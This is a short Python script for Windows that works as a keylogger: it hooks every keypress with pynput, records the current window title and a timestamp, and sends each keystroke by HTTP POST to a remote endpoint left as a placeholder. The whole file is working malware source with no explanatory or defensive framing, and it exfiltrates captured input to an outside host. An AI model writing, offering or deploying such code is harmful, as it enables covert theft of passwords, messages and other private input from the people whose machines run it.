from pynput import keyboard
import win32gui
from datetime import datetime
import requests

window = win32gui.GetForegroundWindow()
window_name = win32gui.GetWindowText(window)

def catch(key):
    if key == keyboard.Key.esc:
        return False

    response = requests.post(
        "<YOUR API ENDPOINT>",
        json={
            "time": datetime.now().isoformat(),
            "window": window_name,
            "keypress": str(key)
        },
        timeout=10
    )

keyboard.Listener(on_press=catch).run()




